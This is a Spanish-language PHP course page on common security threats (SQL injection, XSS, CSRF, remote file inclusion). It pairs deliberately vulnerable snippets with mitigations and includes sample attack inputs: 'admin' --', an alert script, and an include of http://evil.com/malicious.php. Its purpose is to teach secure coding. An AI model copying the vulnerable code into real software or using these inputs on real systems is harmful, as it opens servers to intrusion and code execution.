<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amenazas Comunes de Seguridad</title>

    <link rel="alternate" href="https://campusempresa.com/es/php/common-security-threats" hreflang="es" />
    <link rel="alternate" href="https://campusempresa.com/es/php/common-security-threats" hreflang="x-default" />
	<link rel="alternate" href="https://campusempresa.com/ca/php/common-security-threats" hreflang="ca" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body>
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/es/"><img src="/img/logo_header.png" style="visibility:hiddenxx;"></a>
			</h1>
		</div>
		<div class="col-4 p-0 text-end">
			<h2 id="main_title"><cite>Construyendo la sociedad de hoy y del mañana</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
										<b id="lit_lang_es" class="px-2">ES</b>
				|
				<a href="/ca/php/common-security-threats" id="lnk_lang_ca" data-lang="ca" class="px-2">CA</a>
					</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/es/objective">El Proyecto</a>
				<a href="/es/about">Sobre nosotros</a>
				<a href="/es/contribute">Contribuir</a>
				<a href="/es/donate">Donaciones</a>
				<a href="/es/licence">Licencia</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content"><div class='row navigation'>
	<div class='col-4'>
					<a href='building-simple-mvc-framework'>&#x25C4;Construcción de un Framework MVC Simple</a>
			</div>
	<div class='col-4 text-center'>
		<a href="./" class="title">Amenazas Comunes de Seguridad</a>
	</div>
	<div class='col-4 text-end'>
					<a href='data-sanitization-and-validation'>Saneamiento y Validación de Datos &#x25BA;</a>
			</div>
</div>
<div class='content'><p>En esta sección, exploraremos las amenazas comunes de seguridad que los desarrolladores de PHP deben conocer. Entender estas amenazas es crucial para escribir aplicaciones PHP seguras. Cubriremos varios tipos de ataques, cómo funcionan y cómo mitigarlos.</p>
</div><h1>Inyección SQL</h1>
<div class='content'><p>La inyección SQL es una de las amenazas de seguridad más comunes y peligrosas. Ocurre cuando un atacante puede manipular una consulta SQL inyectando código SQL malicioso.</p>
</div><h2>Ejemplo de Inyección SQL</h2>
<div class='content'><p>Considera el siguiente código PHP que es vulnerable a la inyección SQL:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJHVzZXJuYW1lID0gJF9HRVRbJ3VzZXJuYW1lJ107CiRwYXNzd29yZCA9ICRfR0VUWydwYXNzd29yZCddOwoKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWUgPSAnJHVzZXJuYW1lJyBBTkQgcGFzc3dvcmQgPSAnJHBhc3N3b3JkJyI7CiRyZXN1bHQgPSBteXNxbGlfcXVlcnkoJGNvbm4sICRxdWVyeSk7Cj8+"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$username = $_GET['username'];
$password = $_GET['password'];

$query = &quot;SELECT * FROM users WHERE username = '$username' AND password = '$password'&quot;;
$result = mysqli_query($conn, $query);
?&gt;</pre></div><div class='content'><p>Si un atacante ingresa <code>admin' --</code> como el nombre de usuario y cualquier cosa como la contraseña, la consulta se convierte en:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("U0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZSA9ICdhZG1pbicgLS0nIEFORCBwYXNzd29yZCA9ICcn"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>SELECT * FROM users WHERE username = 'admin' --' AND password = ''</pre></div><div class='content'><p>Esto efectivamente comenta la verificación de la contraseña, permitiendo al atacante eludir la autenticación.</p>
</div><h2>Mitigación</h2>
<div class='content'><p>Para prevenir la inyección SQL, siempre usa declaraciones preparadas y consultas parametrizadas:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJHVzZXJuYW1lID0gJF9HRVRbJ3VzZXJuYW1lJ107CiRwYXNzd29yZCA9ICRfR0VUWydwYXNzd29yZCddOwoKJHN0bXQgPSAkY29ubi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZSA9ID8gQU5EIHBhc3N3b3JkID0gPyIpOwokc3RtdC0+YmluZF9wYXJhbSgic3MiLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CiRzdG10LT5leGVjdXRlKCk7CiRyZXN1bHQgPSAkc3RtdC0+Z2V0X3Jlc3VsdCgpOwo/Pg=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$username = $_GET['username'];
$password = $_GET['password'];

$stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);
$stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
$stmt-&gt;execute();
$result = $stmt-&gt;get_result();
?&gt;</pre></div><div class='content'></div><h1>Cross-Site Scripting (XSS)</h1>
<div class='content'><p>Los ataques XSS ocurren cuando un atacante inyecta scripts maliciosos en contenido que luego es renderizado por el navegador de un usuario. Esto puede llevar al robo de datos, secuestro de sesiones y otras actividades maliciosas.</p>
</div><h2>Ejemplo de XSS</h2>
<div class='content'><p>Considera el siguiente código PHP que es vulnerable a XSS:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKZWNobyAiSGVsbG8sICIgLiAkX0dFVFsnbmFtZSddOwo/Pg=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
echo &quot;Hello, &quot; . $_GET['name'];
?&gt;</pre></div><div class='content'><p>Si un atacante ingresa <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code> como el nombre, el script se ejecutará en el navegador del usuario.</p>
</div><h2>Mitigación</h2>
<div class='content'><p>Para prevenir XSS, siempre sanitiza y escapa la entrada del usuario:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKZWNobyAiSGVsbG8sICIgLiBodG1sc3BlY2lhbGNoYXJzKCRfR0VUWyduYW1lJ10sIEVOVF9RVU9URVMsICdVVEYtOCcpOwo/Pg=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
echo &quot;Hello, &quot; . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?&gt;</pre></div><div class='content'></div><h1>Cross-Site Request Forgery (CSRF)</h1>
<div class='content'><p>Los ataques CSRF ocurren cuando un atacante engaña a un usuario para que realice acciones en una aplicación web donde está autenticado. Esto puede llevar a que se realicen acciones no autorizadas en nombre del usuario.</p>
</div><h2>Ejemplo de CSRF</h2>
<div class='content'><p>Considera un formulario que permite a un usuario cambiar su dirección de correo electrónico:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PGZvcm0gYWN0aW9uPSJjaGFuZ2VfZW1haWwucGhwIiBtZXRob2Q9IlBPU1QiPgogICAgPGlucHV0IHR5cGU9ImVtYWlsIiBuYW1lPSJlbWFpbCI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ2hhbmdlIEVtYWlsIj4KPC9mb3JtPg=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;form action=&quot;change_email.php&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Change Email&quot;&gt;
&lt;/form&gt;</pre></div><div class='content'><p>Un atacante podría crear un formulario malicioso que envíe una solicitud a <code>change_email.php</code> sin el conocimiento del usuario.</p>
</div><h2>Mitigación</h2>
<div class='content'><p>Para prevenir CSRF, usa tokens para validar las solicitudes:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKc2Vzc2lvbl9zdGFydCgpOwokdG9rZW4gPSBiaW4yaGV4KHJhbmRvbV9ieXRlcygzMikpOwokX1NFU1NJT05bJ3Rva2VuJ10gPSAkdG9rZW47Cj8+Cgo8Zm9ybSBhY3Rpb249ImNoYW5nZV9lbWFpbC5waHAiIG1ldGhvZD0iUE9TVCI+CiAgICA8aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9ImVtYWlsIj4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkdG9rZW47ID8+Ij4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDaGFuZ2UgRW1haWwiPgo8L2Zvcm0+"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
session_start();
$token = bin2hex(random_bytes(32));
$_SESSION['token'] = $token;
?&gt;

&lt;form action=&quot;change_email.php&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $token; ?&gt;&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Change Email&quot;&gt;
&lt;/form&gt;</pre></div><div class='content'><p>En <code>change_email.php</code>, valida el token:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoJF9QT1NUWyd0b2tlbiddICE9PSAkX1NFU1NJT05bJ3Rva2VuJ10pIHsKICAgIGRpZSgiQ1NSRiB0b2tlbiB2YWxpZGF0aW9uIGZhaWxlZCIpOwp9CgovLyBQcm9jZWVkIHdpdGggZW1haWwgY2hhbmdlCj8+"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
session_start();
if ($_POST['token'] !== $_SESSION['token']) {
    die(&quot;CSRF token validation failed&quot;);
}

// Proceed with email change
?&gt;</pre></div><div class='content'></div><h1>Ejecución Remota de Código (RCE)</h1>
<div class='content'><p>RCE ocurre cuando un atacante puede ejecutar código arbitrario en el servidor. Esto puede llevar a la completa compromisión del servidor.</p>
</div><h2>Ejemplo de RCE</h2>
<div class='content'><p>Considera el siguiente código PHP que es vulnerable a RCE:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJGZpbGVuYW1lID0gJF9HRVRbJ2ZpbGUnXTsKaW5jbHVkZSgkZmlsZW5hbWUpOwo/Pg=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$filename = $_GET['file'];
include($filename);
?&gt;</pre></div><div class='content'><p>Si un atacante ingresa <code>http://evil.com/malicious.php</code> como el archivo, el código malicioso se ejecutará en el servidor.</p>
</div><h2>Mitigación</h2>
<div class='content'><p>Para prevenir RCE, nunca incluyas archivos basados en la entrada del usuario. Usa una lista blanca de archivos permitidos:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("PD9waHAKJGFsbG93ZWRfZmlsZXMgPSBbJ2hvbWUucGhwJywgJ2Fib3V0LnBocCcsICdjb250YWN0LnBocCddOwokZmlsZW5hbWUgPSAkX0dFVFsnZmlsZSddOwoKaWYgKGluX2FycmF5KCRmaWxlbmFtZSwgJGFsbG93ZWRfZmlsZXMpKSB7CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cn0gZWxzZSB7CiAgICBkaWUoIkludmFsaWQgZmlsZSIpOwp9Cj8+"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>&lt;?php
$allowed_files = ['home.php', 'about.php', 'contact.php'];
$filename = $_GET['file'];

if (in_array($filename, $allowed_files)) {
    include($filename);
} else {
    die(&quot;Invalid file&quot;);
}
?&gt;</pre></div><div class='content'></div><h1>Resumen</h1>
<div class='content'><p>Entender y mitigar las amenazas comunes de seguridad es esencial para los desarrolladores de PHP. Aquí están los puntos clave a recordar:</p>
<ul>
<li><strong>Inyección SQL</strong>: Usa declaraciones preparadas y consultas parametrizadas.</li>
<li><strong>XSS</strong>: Sanitiza y escapa la entrada del usuario.</li>
<li><strong>CSRF</strong>: Usa tokens para validar las solicitudes.</li>
<li><strong>RCE</strong>: Evita incluir archivos basados en la entrada del usuario; usa una lista blanca.</li>
</ul>
<p>Siguiendo estas mejores prácticas, puedes reducir significativamente el riesgo de vulnerabilidades de seguridad en tus aplicaciones PHP.</p>
</div><div class='row navigation'>
	<div class='col-4'>
					<a href='building-simple-mvc-framework'>&#x25C4;Construcción de un Framework MVC Simple</a>
			</div>
	<div class='col-4 text-center'>
		<a href="./" class="title">Amenazas Comunes de Seguridad</a>
	</div>
	<div class='col-4 text-end'>
					<a href='data-sanitization-and-validation'>Saneamiento y Validación de Datos &#x25BA;</a>
			</div>
</div>
</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Publicidad</h1>
			<p>Este espacio está destinado a publicidad.</p>
			<p>Si quieres ser patrocinador, contáctanos para incluir enlaces en esta zona: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>¡Gracias por colaborar!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Todos los derechos reservados</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Entès!</a>
    <a href="/es/cookies">Més informació</a>
</div>	

	</div>    
</body>
</html>
